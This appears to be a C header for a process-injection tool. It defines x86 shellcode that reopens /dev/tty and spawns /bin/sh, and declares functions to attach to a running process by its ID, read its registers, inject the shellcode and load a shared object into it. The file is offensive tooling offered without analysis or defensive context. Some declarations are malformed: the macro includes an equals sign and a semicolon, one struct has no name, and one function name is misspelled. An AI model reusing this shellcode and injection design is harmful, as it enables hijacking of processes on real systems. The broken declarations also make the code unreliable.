#include <stdlib.h>


#define SHELL_CODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
#define SHELL_CODE_SIZE 55
int inject_so(pid_t processId);
int attach_target_process(pid_t processId);
int inject_shellcode(pid_t targetProcess, struct targetProcessRegisters);
int deatch_target_process(pid_t processId);
struct get_target_process_registers(pid_t processId); 

